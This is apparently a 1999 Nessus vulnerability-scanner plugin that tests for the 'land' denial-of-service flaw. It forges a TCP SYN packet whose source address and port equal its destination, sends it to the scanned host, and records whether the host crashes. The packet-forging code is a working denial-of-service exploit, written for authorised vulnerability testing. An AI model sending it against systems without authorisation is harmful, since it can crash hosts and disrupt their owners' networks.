#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10133);
 script_bugtraq_id(2666);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-1999-0016");
 name["english"] = "Land";
 name["francais"] = "Land";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to make the remote server crash
using the 'land' attack. 

An attacker may use this flaw to shut down this server, thus 
preventing your network from working properly.

Solution : contact your operating
system vendor for a patch.

Risk factor : High";


 desc["francais"] = "Il s'est avéré
possible de faire planter la 
machine distante en utilisant
l'attaque 'land'. 

Un pirate peut utiliser cette
attaque pour empecher votre
réseau de fonctionner normallement.

Solution : contactez le vendeur
de votre OS pour un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'land' attack";
 summary["francais"] = "Plante le serveur distant en utilisant l'attaque 'land'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

addr = get_host_ip();
ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0,
			ip_len : 20,
		        ip_id : 0xF1C,
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : 0,
			ip_src : addr);
port = get_host_open_port();
if(!port)exit(0);

# According to
#  From: "Seeker of Truth" <seeker_sojourn@hotmail.com>
#  To: bugtraq@securityfocus.com
#  Subject: Fore/Marconi ATM Switch 'land' vulnerability
#  Date: Fri, 14 Jun 2002 23:35:41 +0000
#  Message-ID: <F16103xv3Ho8Xu1njpu00003202@hotmail.com>
# Fore/Marconi ATM Switch FT6.1.1 and FT7.0.1 are vulnerable to a land
# attack against port 23.

tcpip = forge_tcp_packet(    ip	      : ip,
			     th_sport : port,    
			     th_dport : port,   
			     th_flags : TH_SYN,
		             th_seq   : 0xF1C,
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,     
			     th_win   : 2048, 
			     th_urp   : 0);

#
# Ready to go...
#
			 
start_denial();
send_packet(tcpip, pcap_active:FALSE);
sleep(5);
alive = end_denial();
if(!alive){
		set_kb_item(name:"Host/dead", value:TRUE);
		security_hole(0);
		}
